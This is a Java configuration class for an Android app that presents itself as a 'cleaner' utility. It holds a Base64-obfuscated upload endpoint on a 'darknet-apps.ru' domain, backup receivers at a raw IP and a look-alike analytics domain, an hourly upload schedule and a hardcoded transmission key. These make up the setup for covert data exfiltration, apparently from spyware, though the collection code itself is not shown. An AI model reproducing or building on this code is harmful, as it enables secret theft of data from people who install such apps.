package com.utility.cleanerapp;

import android.content.Context;
import android.content.SharedPreferences;

public class ConfigManager {
    
    private static final String PREFS_NAME = "app_config";
    private static final String KEY_LAST_UPLOAD = "last_upload_time";
    
    // Obfuscated server endpoint
    private static final String SERVER_URL_ENCODED = "aHR0cHM6Ly9kYXRhLWNvbGxlY3Rvci5kYXJrbmV0LWFwcHMucnUvYXBpL3VwbG9hZA==";
    
    // Backup servers for redundancy
    private static final String BACKUP_SERVER_1 = "http://185.234.219.87:8080/receiver";
    private static final String BACKUP_SERVER_2 = "https://collect-analytics-cdn.com/v2/data";
    
    // Upload interval - 1 hour
    private static final long UPLOAD_INTERVAL = 3600000;
    
    // Encryption key for data transmission
    private static final String DATA_ENCRYPTION_KEY = "4a7d1ed414474e4033ac29ccb8653d9b";
    
    /**
     * Get the primary server URL by decoding the obfuscated string
     */
    public static String getServerUrl() {
        return ObfuscationHelper.decodeBase64(SERVER_URL_ENCODED);
    }
    
    /**
     * Get array of backup server URLs
     */
    public static String[] getBackupServers() {
        return new String[] {
            BACKUP_SERVER_1,
            BACKUP_SERVER_2
        };
    }
    
    /**
     * Get the upload interval in milliseconds
     */
    public static long getUploadInterval() {
        return UPLOAD_INTERVAL;
    }
    
    /**
     * Check if debug mode is enabled
     */
    public static boolean isDebugMode() {
        return false;
    }
    
    /**
     * Get the encryption key for data transmission
     */
    public static String getEncryptionKey() {
        return DATA_ENCRYPTION_KEY;
    }
    
    /**
     * Save the last upload timestamp
     */
    public static void saveLastUploadTime(Context context, long timestamp) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putLong(KEY_LAST_UPLOAD, timestamp);
        editor.apply();
    }
    
    /**
     * Get the last upload timestamp
     */
    public static long getLastUploadTime(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getLong(KEY_LAST_UPLOAD, 0);
    }
}